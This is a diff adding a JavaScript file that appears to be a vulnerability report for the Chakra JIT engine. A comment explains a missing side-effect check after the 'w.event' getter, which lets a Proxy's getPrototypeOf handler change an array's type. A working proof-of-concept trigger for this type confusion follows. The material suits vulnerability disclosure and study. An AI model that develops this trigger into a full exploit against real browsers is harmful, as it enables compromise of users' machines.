@@ -1,0 +1,59 @@
+/*
+function opt(w, arr) {
+    arr[0] = 1.1;
+    let res = w.event;
+    arr[0] = 2.3023e-320;
+    return res;
+}
+
+let arr = [1.1];
+for (let i = 0; i < 10000; i++) {
+    opt(window, arr);
+}
+
+The above code will be compiled as follows:
+000001a8`8000122b 48b8503dcfd5ff7f0000 mov rax,offset chakra!DOMFastPath<7>::EntrySimpleObjectSlotGetter (00007fff`d5cf3d50)  // w.event
+000001a8`80001235 48ffd0          call    rax
+000001a8`80001238 488b8e30bdf0ff  mov     rcx,qword ptr [rsi-0F42D0h]
+000001a8`8000123f f2480f104158    movsd   xmm0,mmword ptr [rcx+58h]
+000001a8`80001245 f2490f11442418  movsd   mmword ptr [r12+18h],xmm0  // arr[0] = 2.3023e-320;
+...
+
+As you can see, there's no "ImplicitCallFlags" check after the call to the "EntrySimpleObjectSlotGetter" method. The code was generated based on the assumption that the method has no side effects. But in fact, the method can have side effects. The method wraps the return value using the "CrossSite::MarshalVar" method which traverses up the prototype chain of the given object using the "GetPrototype" method, since the "GetPrototype" method may invoke the "getPrototypeOf" handler of a Proxy object, changing the type of the array in the handler will lead to type confusion.
+
+PoC:
+*/
+
+function opt(w, arr) {
+    arr[0] = 1.1;
+    let res = w.event;
+    arr[0] = 2.3023e-320;
+    return res;
+}
+
+function main() {
+    let f = document.body.appendChild(document.createElement('iframe'));
+    f.contentWindow;
+
+    for (let i = 0; i < 100000; i++) {
+        opt(window, [1.1]);
+    }
+
+    let set_callback = new f.contentWindow.Function('callback', `
+        window.__lookupSetter__('event').call(parent, new Proxy({}, {
+            getPrototypeOf() {
+                callback();
+                return {};
+            }
+        }));`);
+
+    let arr = [1.1];
+    set_callback(() => {
+        arr[0] = {};
+    });
+
+    opt(window, arr);
+    alert(arr);
+}
+
+main();
